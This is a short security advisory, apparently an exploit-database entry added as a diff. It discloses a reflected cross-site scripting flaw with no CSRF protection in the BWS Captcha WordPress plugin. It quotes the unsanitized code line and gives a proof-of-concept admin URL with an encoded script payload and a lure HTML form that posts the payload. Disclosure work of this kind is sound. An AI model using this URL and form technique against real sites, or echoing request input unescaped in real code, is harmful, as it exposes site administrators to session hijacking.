@@ -1,0 +1,34 @@
+* Exploit Title: BWS Captcha Multiple Vulnerabilities
+* Discovery Date:12.03.2015
+* Public Disclosure Date:03.10.2016
+* Exploit Author: Colette Chamberland
+* Contact: colette@wordfence.com
+* Vendor Homepage: http://bestwebsoft.com/
+* Software Link: https://wordpress.org/plugins/captcha/
+* Version:  <=4.1.5
+* Tested on: Wordpress 4.2.x
+* Category: Wordpress
+* CVE: Requested but none received
+ 
+Description
+================================================================================
+Unsanitized input in whitelist.php:
+
+297: $message = __( 'Search results for', $this->textdomain ) . '&nbsp;:&nbsp;' . $_REQUEST['s'];
+
+ 
+PoC
+================================================================================
+The variable can be passed in using a get as well as a post. An attacker
+could send unsuspecting authenticated admin a url crafted like such:
+
+http://wwww.victim.com/wp-admin/admin.php?page=captcha.php&action=whitelist&s=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
+
+or they can send a form (no CSRF token check)
+
+<form method="post" action="http://victim.com/wp-admin/admin.php?page=captcha.php&action=whitelist">
+<input type="hidden" name="s" value="<script>alert(1);</script>">
+<input type="submit" name="Search IP" value="Click here to claim your prize!">
+</form>
+
+and it would execute XSS as long as they were logged in to the site.
